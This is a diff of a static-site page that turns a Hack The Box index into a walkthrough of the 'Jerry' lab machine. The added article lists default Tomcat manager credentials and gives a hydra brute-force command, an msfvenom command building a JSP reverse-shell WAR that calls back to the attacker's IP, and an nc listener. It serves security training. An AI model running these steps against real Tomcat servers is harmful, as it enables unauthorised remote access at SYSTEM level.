@@ -6,17 +6,13 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Write-ups for HTB lab machines — rooted, documented, and understood.">
+        <meta name="description" content="Apache Tomcat with default credentials on the manager panel. Upload a malicious WAR file, get a shell as SYSTEM.">
       
       
         <meta name="author" content="Fudomaru">
       
       
       
-        <link rel="prev" href="../../overthewire/natas/">
-      
-      
-        <link rel="next" href="../twomillion/">
       
       
         
@@ -27,7 +23,7 @@
     
     
       
-        <title>Hack The Box - Digital Dojo</title>
+        <title>Jerry - Digital Dojo</title>
       
     
     
@@ -143,7 +139,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#hack-the-box" class="md-skip">
+        <a href="#jerry" class="md-skip">
           Skip to content
         </a>
       
@@ -176,7 +172,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Hack The Box
+              Jerry
             
           </span>
         </div>
@@ -356,13 +352,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="../../overview/" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../../../challenges/overview/" class="md-tabs__link">
           
   
   
@@ -402,7 +396,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../notes/overview/" class="md-tabs__link">
+        <a href="../../overview/" class="md-tabs__link">
           
   
   
@@ -2767,29 +2761,24 @@
       
   
   
-    
   
   
-  
     
     
     
     
       
-        
-        
-      
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
             
   
   
@@ -2807,7 +2796,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -2825,7 +2814,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../overview/" class="md-nav__link">
+      <a href="../../../challenges/overview/" class="md-nav__link">
         
   
   
@@ -2903,7 +2892,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../overthewire/bandit/" class="md-nav__link">
+      <a href="../../../challenges/overthewire/bandit/" class="md-nav__link">
         
   
   
@@ -2931,7 +2920,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../overthewire/natas/" class="md-nav__link">
+      <a href="../../../challenges/overthewire/natas/" class="md-nav__link">
         
   
   
@@ -2964,8 +2953,6 @@
                 
   
   
-    
-  
   
   
     
@@ -2976,11 +2963,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
         
           
           <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
@@ -3001,7 +2988,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3016,37 +3003,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Overview
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../challenges/htb/overview/" class="md-nav__link">
         
   
   
@@ -3062,37 +3022,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#machines" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Machines
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -3105,7 +3034,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../twomillion/" class="md-nav__link">
+      <a href="../../../challenges/htb/twomillion/" class="md-nav__link">
         
   
   
@@ -3191,7 +3120,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../thm/overview/" class="md-nav__link">
+      <a href="../../../challenges/thm/overview/" class="md-nav__link">
         
   
   
@@ -3219,7 +3148,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../thm/billing/" class="md-nav__link">
+      <a href="../../../challenges/thm/billing/" class="md-nav__link">
         
   
   
@@ -3595,7 +3524,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/overview/" class="md-nav__link">
+      <a href="../../overview/" class="md-nav__link">
         
   
   
@@ -3623,7 +3552,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/ccna/" class="md-nav__link">
+      <a href="../../ccna/" class="md-nav__link">
         
   
   
@@ -3701,7 +3630,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/media/overview/" class="md-nav__link">
+      <a href="../../media/overview/" class="md-nav__link">
         
   
   
@@ -3729,7 +3658,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/media/how-to-talk-to-anyone/" class="md-nav__link">
+      <a href="../../media/how-to-talk-to-anyone/" class="md-nav__link">
         
   
   
@@ -3757,7 +3686,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/media/algorithms-to-live-by/" class="md-nav__link">
+      <a href="../../media/algorithms-to-live-by/" class="md-nav__link">
         
   
   
@@ -3785,7 +3714,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/media/12-rules-for-life/" class="md-nav__link">
+      <a href="../../media/12-rules-for-life/" class="md-nav__link">
         
   
   
@@ -3821,7 +3750,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/warboard/" class="md-nav__link">
+      <a href="../../warboard/" class="md-nav__link">
         
   
   
@@ -3899,7 +3828,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/unfinished/bash-course-ysap/" class="md-nav__link">
+      <a href="../bash-course-ysap/" class="md-nav__link">
         
   
   
@@ -3927,7 +3856,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../notes/unfinished/footprinting/" class="md-nav__link">
+      <a href="../footprinting/" class="md-nav__link">
         
   
   
@@ -4017,10 +3946,104 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#machines" class="md-nav__link">
+  <a href="#setup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Machines
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-application-tomcat-manager" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web Application — Tomcat Manager
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Discovery
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-war-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation — WAR File Upload
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation — WAR File Upload">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#generate-the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generate the payload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deploy-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deploy it
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#catch-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Catch the shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flags
       
     </span>
   </a>
@@ -4045,64 +4068,6 @@
   
 
 
-  <nav class="md-path" aria-label="Navigation" >
-    <ol class="md-path__list">
-      
-        
-  
-  
-    <li class="md-path__item">
-      <a href="../../.." class="md-path__link">
-        
-  <span class="md-ellipsis">
-    Home
-  </span>
-
-      </a>
-    </li>
-  
-
-      
-      
-        
-  
-  
-    
-    
-      <li class="md-path__item">
-        <a href="../../overview/" class="md-path__link">
-          
-  <span class="md-ellipsis">
-    Challenges
-  </span>
-
-        </a>
-      </li>
-    
-  
-
-      
-        
-  
-  
-    
-    
-      <li class="md-path__item">
-        <a href="./" class="md-path__link">
-          
-  <span class="md-ellipsis">
-    HTB
-  </span>
-
-        </a>
-      </li>
-    
-  
-
-      
-    </ol>
-  </nav>
-
               
               <article class="md-content__inner md-typeset">
                 
@@ -4110,40 +4075,145 @@
 
 
 
-<h1 id="hack-the-box">Hack The Box</h1>
-<p>HackTheBox is where I take on real lab machines in an isolated environment.
-Each box is a small world of its own —
-a misconfigured service, a forgotten credential, a logic flaw waiting to be pulled apart.</p>
-<p>The write-ups here follow the machine from first scan to root.
-No spoilers skipped, no lucky guesses glossed over.
-If something took me an embarrassing amount of time, that stays in.
-The struggle is the point.</p>
-<hr />
-<h2 id="machines">Machines</h2>
+<h1 id="jerry">Jerry</h1>
 <table>
 <thead>
 <tr>
-<th>Machine</th>
-<th>Difficulty</th>
-<th>OS</th>
-<th>Status</th>
+<th></th>
+<th></th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="../twomillion/">TwoMillion</a></td>
+<td><strong>Difficulty</strong></td>
 <td>Easy</td>
-<td>Linux</td>
-<td>Completed</td>
 </tr>
 <tr>
-<td><a href="../blue/">Blue</a></td>
-<td>Easy</td>
-<td>Windows</td>
-<td>Completed</td>
+<td><strong>OS</strong></td>
+<td>Windows Server 2012 R2</td>
+</tr>
+<tr>
+<td><strong>Focus</strong></td>
+<td>Apache Tomcat default credentials + WAR file upload</td>
 </tr>
 </tbody>
 </table>
+<p>Jerry is one of the most straightforward boxes on the platform — and one of the most instructive.
+Apache Tomcat is everywhere in enterprise environments, often running with weak or default credentials on the manager interface.
+That interface can deploy WAR files. WAR files can be web shells or reverse shells.
+The chain is three steps: find the panel, authenticate, deploy code.</p>
+<p>Running as SYSTEM from the start means no privilege escalation needed — the write-up is short, but the lesson is not.</p>
+<hr />
+<h2 id="setup">Setup</h2>
+<p>Kali VM via QEMU. VPN config transferred from host via HTTP server, connected with openvpn.
+If large packets time out, lower the MTU on the tunnel interface:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>tun0<span class="w"> </span>mtu<span class="w"> </span><span class="m">1200</span>
+</code></pre></div>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre><span></span><code>ping<span class="w"> </span>&lt;IP&gt;
+nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span>&lt;IP&gt;
+</code></pre></div>
+<p><strong>Open ports to look for:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>8080</td>
+<td>http</td>
+<td>Apache Tomcat</td>
+</tr>
+</tbody>
+</table>
+<p>Only one real port. Tomcat version in the response header or error pages — note it down.</p>
+<hr />
+<h2 id="web-application-tomcat-manager">Web Application — Tomcat Manager</h2>
+<p>Navigate to <code>http://&lt;IP&gt;:8080</code>.
+The default Tomcat landing page confirms the service and version.</p>
+<p>The manager interface lives at:</p>
+<div class="highlight"><pre><span></span><code>http://&lt;IP&gt;:8080/manager/html
+</code></pre></div>
+<p>This is the admin panel that allows WAR file deployment. It is protected by HTTP basic authentication.</p>
+<hr />
+<h2 id="credential-discovery">Credential Discovery</h2>
+<p>Try default Tomcat credentials. Common pairs to attempt:</p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin</td>
+<td>admin</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>password</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>(blank)</td>
+</tr>
+<tr>
+<td>tomcat</td>
+<td>tomcat</td>
+</tr>
+<tr>
+<td>tomcat</td>
+<td>s3cret</td>
+</tr>
+<tr>
+<td>manager</td>
+<td>manager</td>
+</tr>
+</tbody>
+</table>
+<p>Hydra or Metasploit's <code>auxiliary/scanner/http/tomcat_mgr_login</code> can brute-force this if manual attempts fail.</p>
+<div class="highlight"><pre><span></span><code>hydra<span class="w"> </span>-L<span class="w"> </span>/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-P<span class="w"> </span>/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-f<span class="w"> </span>http-get://&lt;IP&gt;:8080/manager/html
+</code></pre></div>
+<p>Note which credentials worked and log them.</p>
+<hr />
+<h2 id="exploitation-war-file-upload">Exploitation — WAR File Upload</h2>
+<h3 id="generate-the-payload">Generate the payload</h3>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span>&lt;your-tun0-IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt;<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-f<span class="w"> </span>war<span class="w"> </span>-o<span class="w"> </span>shell.war
+</code></pre></div>
+<h3 id="deploy-it">Deploy it</h3>
+<p>In the Tomcat Manager UI, scroll to the <strong>Deploy</strong> section, upload <code>shell.war</code>, and click Deploy.
+The application will appear in the application list.</p>
+<h3 id="catch-the-shell">Catch the shell</h3>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span>&lt;port&gt;
+</code></pre></div>
+<p>Then trigger the WAR by navigating to:</p>
+<div class="highlight"><pre><span></span><code>http://&lt;IP&gt;:8080/shell/
+</code></pre></div>
+<p>The shell connects back. Confirm the user context — Tomcat typically runs as SYSTEM on Windows.</p>
+<hr />
+<h2 id="flags">Flags</h2>
+<p>Both flags are in the same location on this box:</p>
+<div class="highlight"><pre><span></span><code>type C:\Users\Administrator\Desktop\flags\*
+</code></pre></div>
+<p><strong>User flag:</strong> <code>&lt;!-- insert here --&gt;</code></p>
+<p><strong>Root flag:</strong> <code>&lt;!-- insert here --&gt;</code></p>
+<hr />
+<div class="admonition example">
+<p class="admonition-title">Conclusion</p>
+<p>Write this after completing the box.
+Cover: why Tomcat manager should never be internet-facing, how default credentials are a systemic risk not a one-off mistake,
+and what a WAR deployment looks like in access logs — useful context for the defensive side of CJCA.</p>
+</div>
 
 
 
@@ -4177,44 +4247,6 @@ The struggle is the point.</p>
       
         <footer class="md-footer">
   
-    
-      
-      <nav class="md-footer__inner md-grid" aria-label="Footer" >
-        
-          
-          <a href="../../overthewire/natas/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Natas">
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
-            </div>
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Previous
-              </span>
-              <div class="md-ellipsis">
-                Natas
-              </div>
-            </div>
-          </a>
-        
-        
-          
-          <a href="../twomillion/" class="md-footer__link md-footer__link--next" aria-label="Next: TwoMillion">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
-                TwoMillion
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
     
   
   <div class="md-footer-meta md-typeset">
